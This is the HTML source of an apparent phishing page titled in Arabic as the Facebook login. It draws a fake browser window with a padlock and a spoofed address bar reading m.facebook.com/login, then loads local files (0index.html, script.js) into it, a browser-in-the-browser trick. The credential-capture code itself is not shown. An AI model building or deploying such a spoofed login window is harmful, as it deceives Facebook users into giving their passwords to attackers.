<!DOCTYPE html>
<html>
<head>
	<title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
	<link rel="shortcut icon" href="./icon.svg">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
<div id="window">
<!-- Title bar start -->
<div id="title-bar-width">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="./icon.svg" width="20px" height="15px" id="logo">
			<span id="logo-description">فيسبوك</span>
		</div>

		<div>
			<span id="minimize">&#8212;</span>
			<span id="square">□</span>
			<span id="exit">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">https://m.facebook.com</span>
		<span id="domain-path">/login/?privacy</span>
	</div>
</div>
<!-- Content start -->
<iframe id="content" src="0index.html" frameBorder="0"></iframe>
</div>
</body>
<script src="script.js"></script>
</html>
